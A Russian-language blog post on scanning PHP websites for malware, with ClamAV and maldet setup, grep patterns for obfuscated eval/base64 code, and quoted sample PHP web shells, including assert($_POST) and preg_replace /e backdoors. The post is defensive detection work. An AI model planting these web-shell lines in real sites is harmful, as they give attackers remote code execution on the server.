<!doctype html><html lang=en><head>
<title>PHP: antivirus website check | blog vorona me</title>
<meta charset=utf-8>
<meta name=generator content="Hugo 0.90.1">
<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta http-equiv=x-ua-compatible content="IE=edge">
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70800220-1"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','UA-70800220-1')</script>
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP: antivirus website check">
<meta name=description content="Автоматизированное сканирование:
Базовая установка:
yum install clamav -y cd /root/install rm -rf maldetect-* wget …">
<meta property="og:description" content="Автоматизированное сканирование:
Базовая установка:
yum install clamav -y cd /root/install rm -rf maldetect-* wget …">
<meta property="og:url" content="https://blog.vorona.me/2016/07/php-antivirus-website-check/">
<meta property="og:image" content="images/%!s()">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:creator content>
<meta name=twitter:title content="PHP: antivirus website check">
<meta property="twitter:description" content="Автоматизированное сканирование:
Базовая установка:
yum install clamav -y cd /root/install rm -rf maldetect-* wget …">
<meta name=twitter:image content="images/%!s()">
<link rel=apple-touch-icon sizes=180x180 href=https://blog.vorona.me/images/icons/apple-touch-icon.png>
<link rel=icon type=image/png sizes=32x32 href=https://blog.vorona.me/images/icons/favicon-32x32.png>
<link rel=icon type=image/png sizes=16x16 href=https://blog.vorona.me/images/icons/favicon-16x16.png>
<link rel=manifest href=https://blog.vorona.me/images/icons/site.webmanifest>
<link rel=canonical href=https://blog.vorona.me/2016/07/php-antivirus-website-check/>
<link rel=stylesheet href=https://blog.vorona.me/css/styles.fc10447b201851245666b82f4d8fbbb23584133eb8a5357774b559af23e3f655f0b85f9d57ff3606aa16b31b2aa2f9ffda9b2f32b280d4097b6464c77b1ad756.css integrity="sha512-/BBEeyAYUSRWZrgvTY+7sjWEEz64pTV3dLVZryPj9lXwuF+dV/82BqoWsxsqovn/2psvMrKA1Al7ZGTHexrXVg==">
</head>
<body><div class=nav-drop>
<div class=nav-body>
<div class=nav-close></div>
</div>
</div><header class=nav>
<nav class=nav-menu>
<a href=https://blog.vorona.me/ class="nav-brand nav_item">blog vorona me</a>
<div class=nav_bar-wrap>
<div class=nav_bar></div>
</div>
</nav>
</header>
<main>
<section class=post_header style=background-image:url(https://blog.vorona.me/images/thumbnail.svg)>
<h1 class=post_title>PHP: antivirus website check</h1>
</section>
<div class=post>
<article class=post_content><p><strong>Автоматизированное сканирование:</strong></p>
<p>Базовая установка:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>yum install clamav -y  
cd /root/install  
rm -rf maldetect-*  
wget http://www.rfxn.com/downloads/maldetect-current.tar.gz  
tar xfz maldetect-current.tar.gz  
cd maldetect-*  
./install.sh  
cd ~ <span style=color:#f92672>&amp;&amp;</span> rm -rf /root/install/maldetect-* <span style=color:#f92672>&amp;&amp;</span> rm -rf /etc/cron.daily/maldet  
echo <span style=color:#e6db74>&#34;.avi  
</span><span style=color:#e6db74>.jpg  
</span><span style=color:#e6db74>.flv  
</span><span style=color:#e6db74>.png &#34;</span> &gt; /usr/local/maldetect/ignore<span style=color:#ae81ff>\_</span>file<span style=color:#ae81ff>\_</span>ext  
</code></pre></div><p>Сканирование:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>freshclam ; maldet -u ; maldet -d ;  
maldet --scan-all /home/  
</code></pre></div><p><strong>Ручная проверка</strong> на предмет подозрительных файлов:<br>
Подозриельность определяеся наличием следующих комбинаций, которые находятся в одной строке файла:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>eval.*str_rot13  
eval.*base64_decode  
eval.*gzinflate  
file<span style=color:#ae81ff>\_</span>put<span style=color:#ae81ff>\_</span>contents.*base64_decode  
base64_encode.*eval  
eval.<span style=color:#ae81ff>\*</span><span style=color:#f92672>(</span>.<span style=color:#ae81ff>\*</span>GLOBAL.*<span style=color:#f92672>(</span>  
isset.<span style=color:#ae81ff>\*</span><span style=color:#f92672>(</span>.<span style=color:#ae81ff>\*</span>eval.*<span style=color:#f92672>(</span>  
</code></pre></div><p>Однострочники такие:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e>#  </span>
find /var/www/<span style=color:#ae81ff>\*</span>/data/www/<span style=color:#ae81ff>\*</span>/wp-content/uploads/ /home/<span style=color:#ae81ff>\*</span>/domains/<span style=color:#ae81ff>\*</span>/<span style=color:#ae81ff>\*</span>/wp-content/uploads/ /home/<span style=color:#ae81ff>\*</span>/<span style=color:#ae81ff>\*</span>/wp-content/uploads/ -iname <span style=color:#e6db74>&#34;\*.php&#34;</span>  
find /home/ -type f -iname <span style=color:#e6db74>&#34;\*.php&#34;</span> -exec egrep -l <span style=color:#e6db74>&#39;eval.\*str\_rot13|eval.\*base64\_decode|eval.\*gzinflate|file\_put\_contents.\*base64\_decode|base64\_encode.\*eval|eval.\*\(.\*GLOBAL.\*\(|isset.\*\(.\*eval.\*\(|\w{525,}&#39;</span> <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\;</span>  
<span style=color:#75715e>#  </span>
</code></pre></div><p>На что еще можно обратить внимание:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>@system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;killall  
</span><span style=color:#e6db74>file\_put\_contents(&#39;1.txt  
</span><span style=color:#e6db74>assert(  
</span><span style=color:#e6db74>FuncQueueObject  
</span><span style=color:#e6db74>\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65 # == base64_decode  
</span><span style=color:#e6db74>\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65 # == gzinflate  
</span></code></pre></div><p>Интересные примеры:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>&lt;?php $k<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ass&#34;</span>.<span style=color:#e6db74>&#34;ert&#34;</span>; $k<span style=color:#f92672>(</span><span style=color:#e6db74>${</span><span style=color:#e6db74>&#34;_PO&#34;</span>.<span style=color:#e6db74>&#34;ST&#34;</span><span style=color:#e6db74>}</span> <span style=color:#f92672>[</span><span style=color:#e6db74>&#39;pass&#39;</span><span style=color:#f92672>])</span>;?&gt;

  
&lt;?php <span style=color:#f92672>(</span>$b4dboy <span style=color:#f92672>=</span> $_POST<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;gnm&#39;</span><span style=color:#f92672>])</span> &amp;<span style=color:#75715e>#038;&amp;#038; @preg_replace(&#39;/ad/e&#39;,&#39;@&#39;.str_rot13(&#39;riny&#39;).&#39;($b4dboy)&#39;, &#39;add&#39;); ?&gt;</span>

  
&lt;?php <span style=color:#66d9ef>function</span> OLsy<span style=color:#f92672>(</span>$yzcW<span style=color:#f92672>){</span>
$code<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;bas&#39;</span>.<span style=color:#e6db74>&#39;e64_d&#39;</span>.<span style=color:#e6db74>&#39;eco&#39;</span>.<span style=color:#e6db74>&#39;de&#39;</span>;
$yzcW<span style=color:#f92672>=</span>gzinflate<span style=color:#f92672>(</span>$code<span style=color:#f92672>(</span>$yzcW<span style=color:#f92672>))</span>;
 <span style=color:#66d9ef>for</span><span style=color:#f92672>(</span>$i<span style=color:#f92672>=</span>0;$i&lt;strlen<span style=color:#f92672>(</span>$yzcW<span style=color:#f92672>)</span>;$i++<span style=color:#f92672>)</span>
 <span style=color:#f92672>{</span>
$yzcW<span style=color:#f92672>[</span>$i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> chr<span style=color:#f92672>(</span>ord<span style=color:#f92672>(</span>$yzcW<span style=color:#f92672>[</span>$i<span style=color:#f92672>])</span>-1<span style=color:#f92672>)</span>;
 <span style=color:#f92672>}</span>
 <span style=color:#66d9ef>return</span> $yzcW;
 <span style=color:#f92672>}</span>eval<span style=color:#f92672>(</span>OLsy<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;
</span><span style=color:#e6db74>...
</span></code></pre></div>
<div class=post_extra><div class=copy data-share=Copy data-copied=Copied><svg><use xlink:href="#copy"/></svg>
</div>
</div>
</article>
<aside><h3>More from blog vorona me</h3>
<ul class="posts aside">
<li class=post_item>
<a class=post_card href=https://blog.vorona.me/2020/09/install-selfhosted-internal-mailinator/ title="install selfhosted internal mailinator" style=background-image:url(https://blog.vorona.me/images/thumbnail.svg)>
</a>
<div class=excerpt>
<div class=excerpt_meta><div class=copy data-share=Copy data-copied=Copied><svg><use xlink:href="#copy"/></svg>
</div>
</div>
<h3 class=post_link>
<a href=https://blog.vorona.me/2020/09/install-selfhosted-internal-mailinator/>install selfhosted internal mailinator</a>
</h3>
<p class=pale>Setup domain Log in https://my.freenom.com/ buy yourdomain.here for $0/year set glue …</p>
</div>
</li>
<li class=post_item>
<a class=post_card href=https://blog.vorona.me/posts/2016-08-27-chrome-clean-passwords/ title="google-chrome: clean passwords" style=background-image:url(https://blog.vorona.me/images/thumbnail.svg)>
</a>
<div class=excerpt>
<div class=excerpt_meta><div class=copy data-share=Copy data-copied=Copied><svg><use xlink:href="#copy"/></svg>
</div>
</div>
<h3 class=post_link>
<a href=https://blog.vorona.me/posts/2016-08-27-chrome-clean-passwords/>google-chrome: clean passwords</a>
</h3>
<p class=pale>Run google-chrome with &ndash;password-store=basic (example)
dnf install sqliteman cp …</p>
</div>
</li>
</ul>
</aside>
</div>
<script src=https://blog.vorona.me/js/autosize.min.js></script>
<script src=https://blog.vorona.me/js/timeago.js></script>
</main><svg width="0" height="0" class="hidden"><symbol viewBox="0 0 699.428 699.428" xmlns="http://www.w3.org/2000/svg" id="copy"><path d="M502.714.0H240.428C194.178.0 153 42.425 153 87.429l-25.267.59c-46.228.0-84.019 41.834-84.019 86.838V612c0 45.004 41.179 87.428 87.429 87.428H459c46.249.0 87.428-42.424 87.428-87.428h21.857c46.25.0 87.429-42.424 87.429-87.428v-349.19zM459 655.715H131.143c-22.95.0-43.714-21.441-43.714-43.715V174.857c0-22.272 18.688-42.993 41.638-42.993l23.933-.721v393.429C153 569.576 194.178 612 240.428 612h262.286c0 22.273-20.765 43.715-43.714 43.715zm153-131.143c0 22.271-20.765 43.713-43.715 43.713H240.428c-22.95.0-43.714-21.441-43.714-43.713V87.429c0-22.272 20.764-43.714 43.714-43.714H459c-.351 50.337.0 87.975.0 87.975.0 45.419 40.872 86.882 87.428 86.882H612zm-65.572-349.715c-23.277.0-43.714-42.293-43.714-64.981V44.348L612 174.857zm-43.714 131.537H306c-12.065.0-21.857 9.77-21.857 21.835s9.792 21.835 21.857 21.835h196.714c12.065.0 21.857-9.771 21.857-21.835.0-12.065-9.792-21.835-21.857-21.835zm0 109.176H306c-12.065.0-21.857 9.77-21.857 21.834.0 12.066 9.792 21.836 21.857 21.836h196.714c12.065.0 21.857-9.77 21.857-21.836.0-12.064-9.792-21.834-21.857-21.834z"/></symbol><symbol viewBox="0 0 60.015 60.015" xmlns="http://www.w3.org/2000/svg" id="reply"><path d="M42.007.0h-24c-9.925.0-18 8.075-18 18v14c0 9.59 7.538 17.452 17 17.973v8.344a1.694 1.694.0 001.699 1.698c.44.0.873-.173 1.198-.498l1.876-1.876C26.708 52.713 33.259 50 40.227 50h1.78c9.925.0 18-8.075 18-18V18c0-9.925-8.075-18-18-18zm16 32c0 8.822-7.178 16-16 16h-1.78c-7.502.0-14.556 2.921-19.86 8.226l-1.359 1.359V44a1 1 0 10-2 0v3.949c-8.356-.52-15-7.465-15-15.949V18c0-8.822 7.178-16 16-16h24c8.822.0 16 7.178 16 16v14z"/></symbol><symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="scan"><path d="M456.66.0H385c-8.284.0-15 6.716-15 15s6.716 15 15 15h71.66C470.632 30 482 41.368 482 55.341V127c0 8.284 6.716 15 15 15s15-6.716 15-15V55.341C512 24.826 487.174.0 456.66.0zM15 142c8.284.0 15-6.716 15-15V55.341C30 41.368 41.368 30 55.34 30H127c8.284.0 15-6.716 15-15s-6.716-15-15-15H55.34C24.826.0.0 24.826.0 55.341V127c0 8.284 6.716 15 15 15zm112 340H55.34C41.368 482 30 470.632 30 456.659V385c0-8.284-6.716-15-15-15s-15 6.716-15 15v71.659C0 487.174 24.826 512 55.34 512H127c8.284.0 15-6.716 15-15s-6.716-15-15-15zm370-112c-8.284.0-15 6.716-15 15v71.659C482 470.632 470.632 482 456.66 482H385c-8.284.0-15 6.716-15 15s6.716 15 15 15h71.66c30.515.0 55.34-24.826 55.34-55.341V385c0-8.284-6.716-15-15-15zM341.643 110h47.575c6.497.0 11.782 5.285 11.782 11.782v47.574c0 8.284 6.716 15 15 15s15-6.716 15-15v-47.574C431 98.743 412.256 80 389.218 80h-47.575c-8.284.0-15 6.716-15 15s6.716 15 15 15zM81 121.782v47.574c0 8.284 6.716 15 15 15s15-6.716 15-15v-47.574c0-6.497 5.286-11.782 11.782-11.782h47.575c8.284.0 15-6.716 15-15s-6.716-15-15-15h-47.575C99.744 80 81 98.743 81 121.782zM170.357 4e2h-47.575c-6.497.0-11.782-5.285-11.782-11.782v-47.574c0-8.284-6.716-15-15-15s-15 6.716-15 15v47.574C81 411.257 99.744 430 122.782 430h47.575c8.284.0 15-6.716 15-15s-6.716-15-15-15zM431 388.218v-47.574c0-8.284-6.716-15-15-15s-15 6.716-15 15v47.574c0 6.497-5.286 11.782-11.782 11.782h-47.575c-8.284.0-15 6.716-15 15s6.716 15 15 15h47.575C412.256 430 431 411.257 431 388.218zM1 256c0 8.284 6.716 15 15 15h480c8.284.0 15-6.716 15-15s-6.716-15-15-15H16c-8.284.0-15 6.716-15 15z"/></symbol></svg>
<footer class=footer>
<div class="footer_inner wrap pale">
<p>&copy;&nbsp;<span class=year></span>&nbsp;blog vorona me.
Designed by <a href=https://www.linkedin.com/in/dan-weru-profile/ title="Linkedin Profile">Weru</a></p>
</div>
</footer><script type=text/javascript src=https://blog.vorona.me/js/bundle.cd225b1effc62be8419eec1525332bb54462215e225fc144fdd034f0b8b54e12912e45eca4f88e11d5908a930e1fc12dff4892df4fbc6a4d7c4a89740b392439.js integrity="sha512-zSJbHv/GK+hBnuwVJTMrtURiIV4iX8FE/dA08Li1ThKRLkXspPiOEdWQipMOH8Et/0iS30+8ak18Sol0CzkkOQ==" crossorigin=anonymous></script>
</body>
</html>